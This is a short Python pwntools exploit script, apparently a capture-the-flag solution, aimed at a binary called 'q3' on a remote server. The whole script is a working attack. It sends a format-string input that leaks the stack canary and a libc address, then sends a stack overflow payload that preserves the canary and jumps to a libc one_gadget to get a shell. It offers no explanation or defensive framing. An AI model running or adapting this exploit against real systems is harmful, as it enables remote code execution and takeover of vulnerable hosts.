from pwn import *

context.log_level ='critical'

e = ELF('./q3')
#p = process('./q3')
p = remote('68.183.158.95',8991)
p.recvuntil(': ',timeout=0.2)
p.sendline('%3$p|%11$p')
p.recvline()
leak = p.recvline().strip().split('|')
canary = int(leak[1],16)
libc = int(leak[0],16)-0xf72b0-0x10
print canary,hex(libc)
payload = "A"*24+p64(canary)+"A"*8+p64(0x45216+libc)
p.recvuntil(': ',timeout=1)
p.sendline(payload)
p.interactive()
